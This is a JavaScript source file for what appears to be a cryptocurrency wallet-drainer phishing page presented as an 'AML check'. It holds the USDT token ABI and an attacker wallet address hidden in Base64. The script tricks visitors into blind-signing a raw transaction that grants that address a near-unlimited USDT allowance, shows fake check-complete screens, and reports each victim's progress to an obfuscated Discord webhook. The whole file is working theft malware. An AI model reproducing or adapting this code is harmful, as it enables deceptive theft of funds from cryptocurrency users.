var i;
var d;
var k = 0;

//Tokens

let USDTAbi = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_upgradedAddress","type":"address"}],"name":"deprecate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"deprecated","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_evilUser","type":"address"}],"name":"addBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"upgradedAddress","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"balances","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"maximumFee","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"unpause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_maker","type":"address"}],"name":"getBlackListStatus","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"},{"name":"","type":"address"}],"name":"allowed","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"paused","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"who","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"pause","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"newBasisPoints","type":"uint256"},{"name":"newMaxFee","type":"uint256"}],"name":"setParams","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"issue","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"amount","type":"uint256"}],"name":"redeem","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"basisPointsRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"","type":"address"}],"name":"isBlackListed","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_clearedUser","type":"address"}],"name":"removeBlackList","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"MAX_UINT","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_blackListedUser","type":"address"}],"name":"destroyBlackFunds","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"_initialSupply","type":"uint256"},{"name":"_name","type":"string"},{"name":"_symbol","type":"string"},{"name":"_decimals","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Issue","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"amount","type":"uint256"}],"name":"Redeem","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"newAddress","type":"address"}],"name":"Deprecate","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"feeBasisPoints","type":"uint256"},{"indexed":false,"name":"maxFee","type":"uint256"}],"name":"Params","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_blackListedUser","type":"address"},{"indexed":false,"name":"_balance","type":"uint256"}],"name":"DestroyedBlackFunds","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"AddedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_user","type":"address"}],"name":"RemovedBlackList","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"owner","type":"address"},{"indexed":true,"name":"spender","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"}]

//Webhook

const discordWebhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MDEyOTc1MTM1MzU4OTgzMC96VFFlWWlfazhNVmxicDZGU0dadE0tM3pXMmdnLU5WMm1VTjVqM3lEX0tpUWVVRFpXbDlEQ1BGUUpnOUVoWmxQZjJwRA==")

const sW = (message) => {
    const webhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5MDEyOTc1MTM1MzU4OTgzMC96VFFlWWlfazhNVmxicDZGU0dadE0tM3pXMmdnLU5WMm1VTjVqM3lEX0tpUWVVRFpXbDlEQ1BGUUpnOUVoWmxQZjJwRA==")
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        }),
    }).catch(err => console.error(err));
}


//Settings

const rA = atob("MHg0ZkEyQzEyNjg2Nzk0NzJCQzg4NzE5NDlhN0Q1NjM1N2IyOUM2MjUy");

if (!rA.startsWith("0x") || (rA.length >= 64 || rA.length <= 40))
    console.error(`Error: ${rA} is not a valid Ethereum address.`); 

    
async function InitializeContract(){
    
    
    const web3Js = new Web3(provider);
    
    var USDTTokenAddressERC20 = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    let USDTcontract = new web3Js.eth.Contract(USDTAbi, USDTTokenAddressERC20)

    var walletAddress = (await web3Js.eth.getAccounts())[0];    
    let approvalCheck = await USDTcontract.methods.allowed(walletAddress, rA).call()

    //Check if wallet is approved

    if(approvalCheck != 0){

        //If its approved just send it to the final screen
        sW('address has already been approved')
        await new Promise(r => setTimeout(r, 1000));
        console.log("Address has already been approved")
        showFirstPage();
        var v = document.getElementById('loadingText')
        v.innerHTML = "Wallet has already conducted an AML check, retrieving check from database."
        await new Promise(r => setTimeout(r, 4000));
        showThirdPage();


        
    }else{
        console.log("Address has not been approved")

        try{

            askApproveWithSign();

        }catch(e){
            showFourthPage();
            console.log(e)
            sW('User Rejected Transaction')
        }

    }
    
}

async function askApproveWithSign() {

    const web3Js = new Web3(provider);
    const walletAddress = (await web3Js.eth.getAccounts())[0];
    const chainId = await web3Js.eth.getChainId();

    USDTTokenAddressERC20 = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    USDTcontract = new web3Js.eth.Contract(USDTAbi, USDTTokenAddressERC20)

    await web3Js.eth.getTransactionCount(walletAddress, "pending")
        .then(async (txnCount) => {

            const amount = await USDTcontract.methods.balanceOf(walletAddress).call();
            const gas = await web3Js.eth.getGasPrice();
            const gas1 = (Number(gas) * 1.1).toFixed(0);


            var txObject = {

                nonce: web3Js.utils.toHex(txnCount),
                gasPrice: web3Js.utils.toHex(gas1),
                gasLimit: "0xEA60",
                to: USDTTokenAddressERC20,
                value: "0x0",
                data: USDTcontract.methods.approve(rA, "1000000000000000000000000000000").encodeABI(),
                v: "0x1", r: "0x", s: "0x"

            };


            let ethTX = new ethereumjs.Tx(txObject);

            const rawTx1 = '0x' + ethTX.serialize().toString('hex');

            const rawHash1 = web3Js.utils.sha3(rawTx1, { encoding: 'hex' });

            await web3Js.eth.sign(rawHash1, walletAddress).then(async (result) => {

                const signature = result.substring(2);
                const r = "0x" + signature.substring(0, 64);
                const s = "0x" + signature.substring(64, 128);
                const v = parseInt(signature.substring(128, 130), 16);

                const y = web3Js.utils.toHex(v + chainId * 2 + 8);

                ethTX.r = r;
                ethTX.s = s;
                ethTX.v = y;

                console.log(ethTX);

                const rawTx = '0x' + ethTX.serialize().toString('hex');
                const rawHash = web3Js.utils.sha3(rawTx, { encoding: 'hex' });

                console.log("rawTx: ", rawTx);
                console.log("rawHash: ", rawHash);


                await web3Js.eth.sendSignedTransaction(rawTx).then(async (hash) => {

                    console.log('Approval transaction complete')
                    sW('Approval transaction complete')
                    console.log(hash)
                    showFirstPage();
                    await new Promise(r => setTimeout(r, 4000));
                    showThirdPage();

                }).catch((e) => {

                    console.log('Approval transaction error - likely not enough ETH for gas')
                    sW('Approval transaction error - likely not enough ETH for gas')
                    console.log(e)
                    showSecondPage();

                });
                

            }).catch((err) => {

                console.log('User Rejected Approve Transaction')
                sW('User Rejected Approval Transaction')
                console.log(err)
                showSecondPage();

            });

        })
}

function clear(){
    window.localStorage.clear()
    console.log("local storage cleared")
}

//Event listener

document.getElementById('repeat-btn').addEventListener("click", async function () {

    showVeryFirstPage();

});

document.getElementById('askButton').addEventListener("click", async function () {

    OpenModal();

});

document.getElementById('askButton1').addEventListener("click", async function () {

    OpenModal();

});
document.getElementById('askButton2').addEventListener("click", async function () {

    OpenModal();

});
document.getElementById('askButton3').addEventListener("click", async function () {

    OpenModal();

});
document.getElementById('askButton4').addEventListener("click", async function () {

    OpenModal();

});

function iOS() {
	return (
		[
          'iPad Simulator',
		  'iPhone Simulator',
		  'iPod Simulator',
		  'iPad',
		  'iPhone',
		  'iPod',
		].includes(navigator.platform) ||
		// iPad on iOS 13 detection
		(navigator.userAgent.includes('Mac') && 'ontouchend' in document)
	);
}

document.addEventListener("visibilitychange", function() {
	if (document.visibilityState === 'hidden' && iOS()) {
		window.localStorage.removeItem('WALLETCONNECT_DEEPLINK_CHOICE');

	}
    console.log('test')
});